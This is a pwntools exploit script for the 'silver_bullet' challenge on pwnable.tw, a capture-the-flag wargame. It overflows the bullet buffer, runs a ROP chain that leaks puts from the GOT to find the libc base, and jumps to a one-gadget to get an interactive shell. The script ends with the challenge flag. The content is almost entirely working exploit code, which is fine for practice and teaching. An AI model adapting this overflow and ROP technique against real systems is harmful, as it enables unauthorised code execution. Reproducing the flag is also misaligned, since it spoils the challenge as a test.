#!/usr/bin/env python2

from pwn import *
from IPython import embed

e = ELF('./silver_bullet')
libc = ELF('./libc.so.6')
r = remote('chall.pwnable.tw', 10103)
#r = remote('127.0.0.1', 7122)

def menu():
	r.recvuntil('choice :')

def create(des):
	menu()
	r.send('1')
	r.recvuntil('bullet :')
	r.send(des)

def powerup(des):
	menu()
	r.send('2')
	r.recvuntil('bullet :')
	r.send(des)

def beat():
	menu()
	r.sendline('3')

def jump_rop(rop):
	create('A'*47)
	powerup('A')
	powerup('\xff'*7+flat(rop))
	beat()

puts_plt = 0x80484a8
pop4 = 0x08048a78
pop3 = 0x08048a79
pop2 = 0x08048a7a
pop1 = 0x08048a7b

rop = [
	puts_plt, pop1, e.got['puts'],
	e.functions['main'].address,
]

jump_rop(rop)
r.recvuntil('You win !!')
x = r.recvuntil('+++++', drop=True)
libc_puts = u32(x[1:-1])
libc_base = libc_puts - libc.symbols['puts']

#magic = 0x3a819
#magic = 0x5f065
magic = 0x5f066
jump_rop(libc_base + magic)


r.interactive()

#FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
